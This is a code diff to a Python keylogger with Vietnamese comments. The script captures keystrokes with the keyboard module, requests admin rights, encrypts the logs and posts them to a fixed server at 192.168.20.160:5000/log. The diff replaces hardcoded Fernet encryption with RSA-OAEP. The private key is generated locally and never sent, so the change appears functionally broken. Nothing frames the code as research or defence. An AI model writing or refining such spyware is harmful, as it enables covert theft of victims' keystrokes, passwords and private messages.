@@ -6,11 +6,22 @@ import time
 import keyboard
 import requests
 import base64
-from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import serialization, hashes
 
-# Khóa mã hóa Fernet (32 bytes base64-url-safe encoded string)
-encryption_key = b'X9w43Qkdw3439fkeudkjd9kXnFAk3FxpdCQq0J1kWxs='
-cipher_suite = Fernet(encryption_key)
+# Generate RSA keys (for demonstration purposes, you should store these securely)
+private_key = rsa.generate_private_key(
+    public_exponent=65537,
+    key_size=2048,
+)
+
+public_key = private_key.public_key()
+
+# Serialize the public key to send to the server or store it
+public_key_pem = public_key.public_bytes(
+    encoding=serialization.Encoding.PEM,
+    format=serialization.PublicFormat.SubjectPublicKeyInfo
+)
 
 # URL của server để nhận log
 server_url = 'http://192.168.20.160:5000/log'  # Địa chỉ server mà bạn muốn gửi log
@@ -34,7 +45,14 @@ def run_as_admin():
 
 def send_encrypted_log(log):
     """Mã hóa log và gửi đến server dưới dạng form data."""
-    encrypted_log = cipher_suite.encrypt(log.encode('utf-8'))
+    encrypted_log = public_key.encrypt(
+        log.encode('utf-8'),
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
     log_data = {'log': base64.urlsafe_b64encode(encrypted_log).decode('utf-8')}  # Tạo form data
 
     try:
